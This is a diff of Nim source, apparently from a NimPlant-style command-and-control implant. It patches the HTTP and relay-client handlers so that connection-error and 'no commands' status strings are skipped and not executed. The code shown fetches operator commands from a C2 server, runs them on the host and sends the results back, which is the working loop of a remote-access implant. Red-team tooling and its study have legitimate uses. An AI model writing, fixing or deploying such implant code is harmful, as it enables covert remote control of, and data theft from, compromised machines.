@@ -1079,17 +1079,23 @@ proc httpHandler() {.async.} =
                     echo "[DEBUG] 🌐 HTTP Handler: No commands from C2 (check-in successful)"
             
             if cmd != "":
-                # Process ALL commands locally (this is a normal implant!)
-                when defined debug:
-                    echo "[DEBUG] 🌐 HTTP Handler: Processing command locally: " & cmd
-                
-                let result = cmdParser.parseCmd(listener, cmd, cmdGuid, args)
-                webClientListener.postCommandResults(listener, cmdGuid, result)
-                
-                when defined debug:
-                    echo "[DEBUG] 🌐 HTTP Handler: ✅ Command executed and result sent to C2"
-                    echo "[DEBUG] 🌐 HTTP Handler: Result (first 200 chars): " & 
-                         (if result.len > 200: result[0..199] & "..." else: result)
+                # CRITICAL FIX: Filter out internal error messages that are NOT real commands
+                if cmd == "NIMPLANT_CONNECTION_ERROR" or cmd.startsWith("ERROR:") or cmd == "NO_COMMANDS":
+                    when defined debug:
+                        echo "[DEBUG] 🚫 HTTP Handler: Ignoring internal status message: " & cmd
+                        echo "[DEBUG] 🚫 HTTP Handler: This is NOT a real command, skipping processing"
+                else:
+                    # Process ALL real commands locally (this is a normal implant!)
+                    when defined debug:
+                        echo "[DEBUG] 🌐 HTTP Handler: Processing command locally: " & cmd
+                    
+                    let result = cmdParser.parseCmd(listener, cmd, cmdGuid, args)
+                    webClientListener.postCommandResults(listener, cmdGuid, result)
+                    
+                    when defined debug:
+                        echo "[DEBUG] 🌐 HTTP Handler: ✅ Command executed and result sent to C2"
+                        echo "[DEBUG] 🌐 HTTP Handler: Result (first 200 chars): " & 
+                             (if result.len > 200: result[0..199] & "..." else: result)
             
             # 4. Sleep with jitter (like normal implant) - ADAPTIVE FOR RELAY SPEED
             let connectionStats = relay_commands.getConnectionStats(g_relayServer)
@@ -1277,6 +1283,14 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                         if args.len > 0:
                             echo "[DEBUG] ⚡ │ Command arguments: " & $args & " │"
                         echo "[DEBUG] ⚡ └─────────────────────────────────────────┘"
+                    
+                    # CRITICAL FIX: Filter out internal error messages in relay client too
+                    if actualCommand == "NIMPLANT_CONNECTION_ERROR" or actualCommand.startsWith("ERROR:") or actualCommand == "NO_COMMANDS":
+                        when defined debug:
+                            echo "[DEBUG] 🚫 Relay Client: Ignoring internal status message: " & actualCommand
+                            echo "[DEBUG] 🚫 Relay Client: This is NOT a real command, skipping processing"
+                        # Don't process internal error messages, just continue to next message
+                        continue
                     
                     # CRITICAL FIX: Use parseCmdRelay for RelayClient command processing
                     when defined debug:
